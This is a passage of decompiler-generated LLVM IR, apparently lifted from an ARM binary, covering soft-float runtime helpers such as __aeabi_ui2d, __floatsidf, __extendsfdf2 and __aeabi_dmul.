  br i1 %v4_1d830, label %bb31, label %dec_label_pc_1d83c

bb31:                                             ; preds = %dec_label_pc_1d830
  %v2_1d834 = load i32, i32* @r2, align 4
  %v5_1d834 = icmp eq i32 %v2_1d834, %v0_1d820
  br i1 %v5_1d834, label %dec_label_pc_1d850, label %dec_label_pc_1d83c

dec_label_pc_1d83c:                               ; preds = %dec_label_pc_1d830, %bb31
  %v2_1d83c = or i32 %v0_1d824, %v0_1d820
  %v4_1d83c = icmp eq i32 %v2_1d83c, 0
  br i1 %v4_1d83c, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_1d83c
  %v1_1d844 = load i32, i32* @r2, align 4
  store i32 %v1_1d844, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1d83c, %bb32
  %v1_1d84c = phi i32 [ %v0_1d820, %dec_label_pc_1d83c ], [ %v1_1d844, %bb32 ]
  ret i32 %v1_1d84c

dec_label_pc_1d850:                               ; preds = %bb31
  %v0_1d850 = load i32, i32* @r1, align 4
  %v1_1d850 = load i32, i32* @r3, align 4
  %v4_1d850 = icmp eq i32 %v1_1d850, %v0_1d850
  br i1 %v4_1d850, label %dec_label_pc_1d850..thread8_crit_edge, label %bb33

dec_label_pc_1d850..thread8_crit_edge:            ; preds = %dec_label_pc_1d850
  %v0_1d860.pre = load i32, i32* @lr, align 4
  br label %.thread8

bb33:                                             ; preds = %dec_label_pc_1d850
  store i32 0, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg6, i32* @lr, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1d850..thread8_crit_edge, %bb33
  %v0_1d860 = phi i32 [ %v0_1d860.pre, %dec_label_pc_1d850..thread8_crit_edge ], [ %arg6, %bb33 ]
  %v2_1d860 = xor i1 %v4_1d850, true
  call void @__pseudo_cond_branch(i1 %v2_1d860, i32 %v0_1d860)
  %v0_1d864 = load i32, i32* @r4, align 4
  %tmp45 = icmp ult i32 %v0_1d864, 2097152
  br i1 %tmp45, label %dec_label_pc_1d86c, label %dec_label_pc_1d880

dec_label_pc_1d86c:                               ; preds = %.thread8
  %v0_1d86c = load i32, i32* %r0.global-to-local, align 4
  %v1_1d86c = icmp slt i32 %v0_1d86c, 0
  %v2_1d86c = mul i32 %v0_1d86c, 2
  store i32 %v2_1d86c, i32* %r0.global-to-local, align 4
  %v0_1d870 = load i32, i32* @r1, align 4
  %v3_1d870 = mul i32 %v0_1d870, 2
  %v4_1d870 = zext i1 %v1_1d86c to i32
  %v5_1d870 = or i32 %v3_1d870, %v4_1d870
  %v9_1d870 = icmp ule i32 %v5_1d870, %v0_1d870
  %v10_1d870 = icmp ult i32 %v3_1d870, %v0_1d870
  %v11_1d870 = select i1 %v1_1d86c, i1 %v9_1d870, i1 %v10_1d870
  br i1 %v11_1d870, label %bb34, label %bb35

bb34:                                             ; preds = %dec_label_pc_1d86c
  br label %bb35

bb35:                                             ; preds = %dec_label_pc_1d86c, %bb34
  ret i32 %v2_1d86c

dec_label_pc_1d880:                               ; preds = %.thread8
  %v2_1d880 = icmp ugt i32 %v0_1d864, -4194305
  br i1 %v2_1d880, label %dec_label_pc_1d880..thread9_crit_edge, label %bb36

dec_label_pc_1d880..thread9_crit_edge:            ; preds = %dec_label_pc_1d880
  %v0_1d88c.pre = load i32, i32* @lr, align 4
  br label %.thread9

bb36:                                             ; preds = %dec_label_pc_1d880
  %v1_1d884 = load i32, i32* @r1, align 4
  %v2_1d884 = add i32 %v1_1d884, 1048576
  store i32 %v2_1d884, i32* @r1, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_1d880..thread9_crit_edge, %bb36
  %v0_1d88c = phi i32 [ %v0_1d88c.pre, %dec_label_pc_1d880..thread9_crit_edge ], [ %arg9, %bb36 ]
  %v2_1d88c = xor i1 %v2_1d880, true
  call void @__pseudo_cond_branch(i1 %v2_1d88c, i32 %v0_1d88c)
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

.thread11:                                        ; preds = %bb
  %v1_1d8c0.pre = load i32, i32* @r1, align 4
  br i1 %tmp44, label %.thread13, label %.thread14

.thread14:                                        ; preds = %.thread11
  store i32 %v1_1d8c0.pre, i32* @r3, align 4
  br label %bb38

bb37:                                             ; preds = %bb30
  %v1_1d8ac = load i32, i32* @r3, align 4
  %v1_1d8b0 = load i32, i32* @r2, align 4
  store i32 %v1_1d8b0, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread14
  %v1_1d8c023 = phi i32 [ %v1_1d8c0.pre, %.thread14 ], [ %v1_1d8ac, %bb37 ]
  %v1_1d8bc = phi i32 [ %v0_1d820, %.thread14 ], [ %v1_1d8b0, %bb37 ]
  store i32 %v1_1d8bc, i32* @r2, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11, %bb38
  %v1_1d8cc = phi i32 [ %v1_1d8c023, %bb38 ], [ %v1_1d8c0.pre, %.thread11 ]
  %v1_1d8d4 = phi i32 [ %v1_1d8bc, %bb38 ], [ %v0_1d820, %.thread11 ]
  %v4_1d8c0 = mul i32 %v1_1d8cc, 4096
  %v5_1d8c0 = or i32 %v4_1d8c0, %v1_1d8d4
  %v7_1d8c0 = icmp eq i32 %v5_1d8c0, 0
  br i1 %v7_1d8c0, label %bb39, label %.thread17

bb39:                                             ; preds = %.thread13
  %v1_1d8c4 = load i32, i32* @r2, align 4
  %v2_1d8c4 = load i32, i32* @r3, align 4
  %v5_1d8c4 = mul i32 %v2_1d8c4, 4096
  %v6_1d8c4 = or i32 %v5_1d8c4, %v1_1d8c4
  %v8_1d8c4 = icmp eq i32 %v6_1d8c4, 0
  br i1 %v8_1d8c4, label %bb40, label %.thread17

bb40:                                             ; preds = %bb39
  %v5_1d8c8 = icmp eq i32 %v2_1d8c4, %v1_1d8cc
  br i1 %v5_1d8c8, label %bb41, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb39, %bb40
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread17
  ret i32 %v1_1d8d4

; uselistorder directives
  uselistorder i32 %v1_1d8c0.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1d870, { 1, 2, 0 }
  uselistorder i32 %v2_1d86c, { 1, 0 }
  uselistorder i1 %v1_1d86c, { 1, 0 }
  uselistorder i32 %v0_1d864, { 1, 0 }
  uselistorder i1 %v4_1d850, { 1, 0 }
  uselistorder i32 %v0_1d824, { 2, 0, 1 }
  uselistorder i32 %v0_1d820, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_1d83c, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__aeabi_ui2d(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_1d8d8 = icmp eq i32 %arg1, 0
  br i1 %v2_1d8d8, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_1d8e0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1d8d8, i32 %v0_1d8e0)
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  %v0_1d8f8 = call i32 @function_1d718()
  ret i32 %v0_1d8f8

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__floatsidf(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_1d8fc = icmp eq i32 %arg1, 0
  br i1 %v2_1d8fc, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_1d904 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1d8fc, i32 %v0_1d904)
  store i32 1074, i32* @r4, align 4
  %v1_1d914 = and i32 %arg1, -2147483648
  store i32 %v1_1d914, i32* @r5, align 4
  %v2_1d914 = icmp eq i32 %v1_1d914, 0
  br i1 %v2_1d914, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_1d918 = sub i32 0, %arg1
  store i32 %v2_1d918, i32* @r0, align 4
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  store i32 0, i32* @r1, align 4
  %v0_1d920 = call i32 @function_1d718()
  ret i32 %v0_1d920

; uselistorder directives
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__extendsfdf2(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %v2_1d924 = mul i32 %arg1, 2
  store i32 %v2_1d924, i32* %r2.global-to-local, align 4
  %v4_1d924 = icmp eq i32 %v2_1d924, 0
  %v1_1d928 = and i32 %v2_1d924, 4
  %v2_1d928 = icmp ne i32 %v1_1d928, 0
  %v3_1d928 = sdiv i32 %v2_1d924, 8
  %v3_1d92c = zext i1 %v2_1d928 to i32
  %v6_1d92c = zext i32 %v3_1d928 to i64
  %v7_1d92c = sub nsw i32 33, %v3_1d928
  %v8_1d92c = zext i32 %v7_1d92c to i64
  %v9_1d92c = shl i64 %v6_1d92c, %v8_1d92c
  %v10_1d92c = sub nsw i32 32, %v3_1d928
  %v11_1d92c = shl i32 %v3_1d92c, %v10_1d92c
  %v12_1d92c = zext i32 %v11_1d92c to i64
  %v14_1d92c = or i64 %v12_1d92c, %v9_1d92c
  %v15_1d92c = trunc i64 %v14_1d92c to i32
  store i32 %v15_1d92c, i32* %r1.global-to-local, align 4
  %v3_1d930 = mul i32 %arg1, 536870912
  store i32 %v3_1d930, i32* @r0, align 4
  br i1 %v4_1d924, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_1d934 = and i32 %v2_1d924, -16777216
  store i32 %v2_1d934, i32* @r3, align 4
  %v4_1d934 = icmp eq i32 %v2_1d934, 0
  br i1 %v4_1d934, label %.thread1, label %bb7

bb7:                                              ; preds = %bb
  %v4_1d938 = icmp ugt i32 %v2_1d924, -16777217
  br i1 %v4_1d938, label %.thread1, label %bb8

bb8:                                              ; preds = %bb7
  %v2_1d93c = xor i32 %v15_1d92c, 939524096
  store i32 %v2_1d93c, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb, %bb7, %bb8
  %v1_1d940 = phi i1 [ false, %bb ], [ false, %bb7 ], [ true, %bb8 ], [ false, %entry ]
  %v0_1d940 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1d940, i32 %v0_1d940)
  %v0_1d944 = load i32, i32* %r2.global-to-local, align 4
  %v2_1d944 = icmp eq i32 %v0_1d944, 0
  br i1 %v2_1d944, label %bb10, label %bb9

bb9:                                              ; preds = %.thread1
  %v1_1d948 = load i32, i32* @r3, align 4
  %v4_1d948 = icmp eq i32 %v1_1d948, -16777216
  br label %bb10

bb10:                                             ; preds = %.thread1, %bb9
  %v1_1d94c = phi i1 [ true, %.thread1 ], [ %v4_1d948, %bb9 ]
  %v0_1d94c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1d94c, i32 %v0_1d94c)
  store i32 896, i32* @r4, align 4
  %v0_1d958 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d958 = and i32 %v0_1d958, -2147483648
  store i32 %v1_1d958, i32* @r5, align 4
  %tmp = bitcast i32 %v0_1d958 to float
  %tmp11 = call float @fabsf(float %tmp)
  %v1_1d95c = bitcast float %tmp11 to i32
  store i32 %v1_1d95c, i32* @r1, align 4
  %v0_1d960 = call i32 @function_1d718()
  ret i32 %v0_1d960

; uselistorder directives
  uselistorder i32 %v3_1d928, { 1, 2, 0 }
  uselistorder i32 %v2_1d924, { 0, 4, 5, 3, 2, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_1d718, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @__aeabi_ul2d(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_1d964 = or i32 %arg2, %arg1
  %v4_1d964 = icmp eq i32 %v2_1d964, 0
  %v0_1d968 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1d964, i32 %v0_1d968)
  store i32 0, i32* @r5, align 4
  %v0_1d974 = call i32 @function_1d994()
  ret i32 %v0_1d974
}

define i32 @__floatdidf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1d978 = or i32 %arg2, %arg1
  %v4_1d978 = icmp eq i32 %v2_1d978, 0
  %v0_1d97c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1d978, i32 %v0_1d97c)
  %v1_1d988 = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_1d988, i32 ptrtoint (i32* @global_var_1d994.1216 to i32))
  %v1_1d98c = sub i32 0, %arg1
  ret i32 %v1_1d98c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_1d994() local_unnamed_addr {
dec_label_pc_1d994:
  %r4.global-to-local = alloca i32, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_1d99c = load i32, i32* @r1, align 4
  %tmp = icmp ult i32 %v0_1d99c, 4194304
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_1d6b8.1214 to i32))
  %tmp6 = icmp ult i32 %v0_1d99c, 33554432
  br i1 %tmp6, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_1d994
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_1d994, %bb
  %v1_1d9b4 = phi i32 [ 3, %dec_label_pc_1d994 ], [ 6, %bb ]
  %tmp7 = icmp ult i32 %v0_1d99c, 268435456
  br i1 %tmp7, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_1d9b4 = add nuw nsw i32 %v1_1d9b4, 3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  %v0_1d9b8 = phi i32 [ %v1_1d9b4, %bb3 ], [ %v2_1d9b4, %bb4 ]
  %not. = icmp slt i32 %v0_1d99c, 0
  %v4_1d9b8 = zext i1 %not. to i32
  %v5_1d9b8 = add nsw i32 %v0_1d9b8, %v4_1d9b8
  %v1_1d9bc = sub nsw i32 32, %v5_1d9b8
  %v0_1d9c0 = load i32, i32* @r0, align 4
  %v6_1d9c0 = shl i32 %v0_1d9c0, %v1_1d9bc
  store i32 %v6_1d9c0, i32* @ip, align 4
  %v6_1d9c4 = lshr i32 %v0_1d9c0, %v5_1d9b8
  %v1_1d9c8 = load i32, i32* @r1, align 4
  %v7_1d9c8 = shl i32 %v1_1d9c8, %v1_1d9bc
  %v8_1d9c8 = or i32 %v7_1d9c8, %v6_1d9c4
  %v6_1d9cc = lshr i32 %v1_1d9c8, %v5_1d9b8
  %v0_1d9d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_1d9d0 = add i32 %v0_1d9d0, %v5_1d9b8
  store i32 %v2_1d9d0, i32* @r4, align 4
  %v4_1d9d4 = sext i32 %v8_1d9c8 to i64
  %v5_1d9d4 = call i32 @function_1d6b8(i64 %v4_1d9d4, i32 %v6_1d9cc, i32 %v5_1d9b8, i32 %v1_1d9bc)
  ret i32 %v5_1d9d4

; uselistorder directives
  uselistorder i32 %v5_1d9b8, { 2, 0, 1, 3, 4 }
  uselistorder i32 6, { 4, 24, 25, 3, 18, 19, 26, 27, 20, 21, 5, 6, 30, 2, 0, 7, 22, 1, 8, 9, 10, 11, 12, 13, 23, 14, 17, 15, 16, 28, 29 }
  uselistorder i32 3, { 55, 13, 41, 70, 42, 71, 72, 73, 75, 9, 76, 17, 77, 57, 0, 14, 78, 10, 1, 2, 67, 58, 3, 4, 43, 44, 86, 45, 46, 47, 48, 49, 50, 59, 7, 21, 60, 22, 23, 62, 24, 63, 25, 64, 26, 65, 27, 66, 54, 8, 56, 51, 87, 15, 82, 19, 83, 18, 84, 20, 81, 11, 79, 12, 61, 5, 74, 85, 52, 6, 28, 68, 29, 30, 69, 31, 53, 34, 33, 32, 40, 80, 35, 36, 37, 38, 39, 16 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dmul(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = sext i32 %arg3 to i64
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp32 = trunc i64 %arg1 to i32
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1d9d8 = load i32, i32* @r4, align 4
  store i32 %v3_1d9d8, i32* %stack_var_-16, align 4
  %v12_1d9d8 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v4_1d9e4 = udiv i32 %arg2, 1048576
  %v5_1d9e4 = urem i32 %v4_1d9e4, 2048
  store i32 %v5_1d9e4, i32* %r4.global-to-local, align 4
  %v6_1d9e4 = icmp eq i32 %v5_1d9e4, 0
  br i1 %v6_1d9e4, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v5_1d9e8 = udiv i32 %arg4, 1048576
  %v6_1d9e8 = urem i32 %v5_1d9e8, 2048
  store i32 %v6_1d9e8, i32* @r5, align 4
  %v7_1d9e8 = icmp eq i32 %v6_1d9e8, 0
  br i1 %v7_1d9e8, label %.thread2, label %bb38

bb38:                                             ; preds = %bb
  %v5_1d9ec = icmp eq i32 %v5_1d9e4, 2047
  br i1 %v5_1d9ec, label %.thread2, label %bb39

bb39:                                             ; preds = %bb38
  %v5_1d9f0 = icmp eq i32 %v6_1d9e8, 2047
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb, %bb38, %bb39
  %v0_1d9f4 = phi i1 [ true, %bb ], [ true, %bb38 ], [ %v5_1d9f0, %bb39 ], [ true, %entry ]
  store i32 ptrtoint (i32* @global_var_1d9f8.1219 to i32), i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_1d9f4, i32 ptrtoint (i32* @global_var_1dbd0.1217 to i32))
  %v0_1d9f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1d9f8 = load i32, i32* @r5, align 4
  %v2_1d9f8 = add i32 %v1_1d9f8, %v0_1d9f8
  store i32 %v2_1d9f8, i32* %r4.global-to-local, align 4
  %v2_1d9fc = xor i32 %arg4, %arg2
  %v1_1da00 = load i32, i32* %ip.global-to-local, align 4
  %tmp51 = mul i32 %v1_1da00, -2097152
  %v5_1da00 = add i32 %tmp51, -1
  %v6_1da00 = and i32 %v5_1da00, %arg2
  store i32 %v6_1da00, i32* %r1.global-to-local, align 4
  %v6_1da04 = and i32 %v5_1da00, %arg4
  %v5_1da08 = mul i32 %arg2, 4096
  %v6_1da08 = or i32 %v5_1da08, %tmp32
  %v8_1da08 = icmp eq i32 %v6_1da08, 0
  br i1 %v8_1da08, label %.thread3, label %bb40

.thread3:                                         ; preds = %.thread2
  %v1_1da105 = or i32 %v6_1da00, 1048576
  store i32 %v1_1da105, i32* %r1.global-to-local, align 4
  %v1_1da147 = or i32 %v6_1da04, 1048576
  br label %dec_label_pc_1da94

bb40:                                             ; preds = %.thread2
  %v6_1da0c = mul i32 %arg4, 4096
  %v7_1da0c = or i32 %v6_1da0c, %arg3
  %v9_1da0c = icmp eq i32 %v7_1da0c, 0
  %v1_1da10 = or i32 %v6_1da00, 1048576
  store i32 %v1_1da10, i32* %r1.global-to-local, align 4
  %v1_1da14 = or i32 %v6_1da04, 1048576
  br i1 %v9_1da0c, label %dec_label_pc_1da94, label %dec_label_pc_1da1c

dec_label_pc_1da1c:                               ; preds = %bb40
  %v6_1da1c = mul nuw i64 %tmp, %arg1
  %v7_1da1c = udiv i64 %v6_1da1c, 4294967296
  %v9_1da1c = trunc i64 %v6_1da1c to i32
  store i32 %v9_1da1c, i32* %ip.global-to-local, align 4
  %v7_1da24 = zext i32 %v1_1da10 to i64
  %v11_1da24 = mul nuw nsw i64 %v7_1da24, %tmp
  %v12_1da24 = add i64 %v11_1da24, %v7_1da1c
  %v1_1da28 = and i32 %v2_1d9fc, -2147483648
  %v10_1da2c = zext i32 %v1_1da14 to i64
  %v11_1da2c = mul nuw i64 %v10_1da2c, %arg1
  %v12_1da2c = add i64 %v12_1da24, %v11_1da2c
  %v13_1da2c = udiv i64 %v12_1da2c, 4294967296
  %v15_1da2c = trunc i64 %v12_1da2c to i32
  %v10_1da34 = mul nuw i64 %v10_1da2c, %v7_1da24
  %v11_1da34 = add i64 %v13_1da2c, %v10_1da34
  %v12_1da34 = udiv i64 %v11_1da34, 4294967296
  %v13_1da34 = trunc i64 %v12_1da34 to i32
  %v14_1da34 = trunc i64 %v11_1da34 to i32
  %v2_1da38 = icmp eq i32 %v9_1da1c, 0
  br i1 %v2_1da38, label %bb42, label %bb41

bb41:                                             ; preds = %dec_label_pc_1da1c
  %v2_1da3c = or i32 %v15_1da2c, 1
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_1da1c, %bb41
  %storemerge = phi i32 [ %v2_1da3c, %bb41 ], [ %v15_1da2c, %dec_label_pc_1da1c ]
  %v0_1da50 = phi i32 [ %v2_1da3c, %bb41 ], [ %v15_1da2c, %dec_label_pc_1da1c ]
  store i32 %storemerge, i32* %lr.global-to-local, align 4
  %v1_1da40 = add i32 %v2_1d9f8, -255
  %v2_1da44 = icmp ugt i32 %v13_1da34, 511
  %v2_1da48 = icmp eq i1 %v2_1da44, false
  %v3_1da48 = add i32 %v2_1d9f8, -1023
  %v5_1da48 = sext i1 %v2_1da48 to i32
  %v6_1da48 = add i32 %v3_1da48, %v5_1da48
  store i32 %v6_1da48, i32* %r4.global-to-local, align 4
  %v3_1da4c = icmp ugt i32 %v1_1da40, 768
  br i1 %v3_1da4c, label %dec_label_pc_1da5c, label %dec_label_pc_1da50

dec_label_pc_1da50:                               ; preds = %bb42
  %v1_1da50 = icmp slt i32 %v0_1da50, 0
  %v2_1da50 = mul i32 %v0_1da50, 2
  store i32 %v2_1da50, i32* %lr.global-to-local, align 4
  %v3_1da54 = mul i32 %v14_1da34, 2
  %v4_1da54 = zext i1 %v1_1da50 to i32
  %v5_1da54 = or i32 %v4_1da54, %v3_1da54
  %v9_1da54 = icmp ule i32 %v5_1da54, %v14_1da34
  %v10_1da54 = icmp ult i32 %v3_1da54, %v14_1da34
  %v11_1da54 = select i1 %v1_1da50, i1 %v9_1da54, i1 %v10_1da54
  %v3_1da5825 = mul nuw nsw i64 %v12_1da34, 2
  %v3_1da58 = trunc i64 %v3_1da5825 to i32
  %v4_1da58 = zext i1 %v11_1da54 to i32
  %v5_1da58 = or i32 %v4_1da58, %v3_1da58
  br label %dec_label_pc_1da5c

dec_label_pc_1da5c:                               ; preds = %bb42, %dec_label_pc_1da50
  %v0_1da6c = phi i32 [ %v0_1da50, %bb42 ], [ %v2_1da50, %dec_label_pc_1da50 ]
  %v0_1da64 = phi i32 [ %v14_1da34, %bb42 ], [ %v5_1da54, %dec_label_pc_1da50 ]
  %v1_1da5c = phi i32 [ %v13_1da34, %bb42 ], [ %v5_1da58, %dec_label_pc_1da50 ]
  %v4_1da5c = mul i32 %v1_1da5c, 2048
  %v4_1da60 = udiv i32 %v0_1da64, 2097152
  %v5_1da5c = or i32 %v4_1da60, %v1_1da28
  %v5_1da60 = or i32 %v5_1da5c, %v4_1da5c
  store i32 %v5_1da60, i32* %r1.global-to-local, align 4
  %v3_1da64 = mul i32 %v0_1da64, 2048
  %v4_1da68 = udiv i32 %v0_1da6c, 2097152
  %v5_1da68 = or i32 %v3_1da64, %v4_1da68
  store i32 %v5_1da68, i32* %r0.global-to-local, align 4
  %v3_1da6c = mul i32 %v0_1da6c, 2048
  store i32 %v3_1da6c, i32* %lr.global-to-local, align 4
  %v1_1da70 = add i32 %v6_1da48, -253
  store i32 %v1_1da70, i32* %ip.global-to-local, align 4
  %v2_1da70 = icmp ugt i32 %v6_1da48, 252
  %v7_1da70 = icmp eq i32 %v6_1da48, 253
  %v2_1da74 = xor i1 %v7_1da70, true
  %v3_1da74 = and i1 %v2_1da70, %v2_1da74
  br i1 %v3_1da74, label %bb43, label %bb44

bb43:                                             ; preds = %dec_label_pc_1da5c
  %v6_1da74 = icmp ugt i32 %v1_1da70, 1791
  %v11_1da74 = icmp eq i32 %v1_1da70, 1792
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_1da5c, %bb43
  %v1_1da78 = phi i1 [ %v7_1da70, %dec_label_pc_1da5c ], [ %v11_1da74, %bb43 ]
  %v0_1da78 = phi i1 [ %v2_1da70, %dec_label_pc_1da5c ], [ %v6_1da74, %bb43 ]
  %v2_1da78 = xor i1 %v1_1da78, true
  %v3_1da78 = and i1 %v0_1da78, %v2_1da78
  call void @__pseudo_cond_branch(i1 %v3_1da78, i32 ptrtoint (i32* @global_var_1dac4.1218 to i32))
  %v0_1da7c = load i32, i32* %lr.global-to-local, align 4
  %v2_1da7c = icmp slt i32 %v0_1da7c, 0
  %v6_1da7c = icmp eq i32 %v0_1da7c, -2147483648
  %v1_1da80 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_1da7c, label %bb45, label %._crit_edge

bb45:                                             ; preds = %bb44
  %v2_1da80 = urem i32 %v1_1da80, 2
  %v3_1da80 = icmp ne i32 %v2_1da80, 0
  %v4_1da80 = udiv i32 %v1_1da80, 2
  store i32 %v4_1da80, i32* %lr.global-to-local, align 4
  br label %._crit_edge

._crit_edge:                                      ; preds = %bb44, %bb45
  %v1_1da84 = phi i1 [ %v3_1da80, %bb45 ], [ %v2_1da7c, %bb44 ]
  %v2_1da84 = zext i1 %v1_1da84 to i32
  %v3_1da84 = add i32 %v2_1da84, %v1_1da80
  store i32 %v3_1da84, i32* %r0.global-to-local, align 4
  %v0_1da88 = load i32, i32* %r1.global-to-local, align 4
  %v1_1da88 = load i32, i32* %r4.global-to-local, align 4
  %v2_1da88 = and i32 %v1_1da88, 4096
  %v3_1da88 = icmp ne i32 %v2_1da88, 0
  %v4_1da88 = mul i32 %v1_1da88, 1048576
  %v6_1da88 = add i32 %v4_1da88, %v0_1da88
  %v7_1da88 = zext i1 %v3_1da88 to i32
  %v8_1da88 = add i32 %v7_1da88, %v6_1da88
  store i32 %v8_1da88, i32* %r1.global-to-local, align 4
  %v2_1da8c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1da8c, i32* %r4.global-to-local, align 4
  store i32 %v12_1d9d8, i32* %lr.global-to-local, align 4
  ret i32 %v3_1da84

dec_label_pc_1da94:                               ; preds = %.thread3, %bb40
  %v1_1daa0 = phi i32 [ %v1_1da147, %.thread3 ], [ %v1_1da14, %bb40 ]
  %v1_1da98 = phi i32 [ %v1_1da105, %.thread3 ], [ %v1_1da10, %bb40 ]
  %v1_1da94 = and i32 %v2_1d9fc, -2147483648
  %v2_1da98 = or i32 %v1_1da98, %v1_1da94
  %v4_1da9c1 = or i64 %tmp, %arg1
  %v4_1da9c = trunc i64 %v4_1da9c1 to i32
  store i32 %v4_1da9c, i32* %r0.global-to-local, align 4
  %v2_1daa0 = xor i32 %v2_1da98, %v1_1daa0
  store i32 %v2_1daa0, i32* %r1.global-to-local, align 4
  %v4_1daa4 = udiv i32 %v1_1da00, 2
  %v5_1daa4 = sub i32 %v2_1d9f8, %v4_1daa4
  store i32 %v5_1daa4, i32* %r4.global-to-local, align 4
  %v7_1daa4 = sub i32 0, %v5_1daa4
  %v8_1daa4 = and i32 %v2_1d9f8, %v7_1daa4
  %v11_1daa4 = icmp eq i32 %v2_1d9f8, %v4_1daa4
  %v7_1daa8 = icmp sgt i32 %v2_1d9f8, %v4_1daa4
  br i1 %v7_1daa8, label %bb46, label %bb47

bb46:                                             ; preds = %dec_label_pc_1da94
  %v10_1daa8 = sub i32 %v1_1da00, %v5_1daa4
  %v12_1daa8 = xor i32 %v5_1daa4, %v1_1da00
  %v13_1daa8 = xor i32 %v10_1daa8, %v1_1da00
  %v14_1daa8 = and i32 %v13_1daa8, %v12_1daa8
  %v17_1daa8 = icmp eq i32 %v1_1da00, %v5_1daa4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_1da94, %bb46
  %v3_1dab4.in = phi i32 [ %v8_1daa4, %dec_label_pc_1da94 ], [ %v14_1daa8, %bb46 ]
  %v2_1dab4.in = phi i32 [ %v5_1daa4, %dec_label_pc_1da94 ], [ %v10_1daa8, %bb46 ]
  %v1_1dab4 = phi i1 [ %v11_1daa4, %dec_label_pc_1da94 ], [ %v17_1daa8, %bb46 ]
  %v2_1dab4 = icmp slt i32 %v2_1dab4.in, 0
  %v3_1dab4 = icmp slt i32 %v3_1dab4.in, 0
  %v3_1daac = xor i1 %v3_1dab4, %v2_1dab4
  %v4_1daac = or i1 %v1_1dab4, %v3_1daac
  br i1 %v4_1daac, label %._crit_edge23, label %bb48

._crit_edge23:                                    ; preds = %bb47
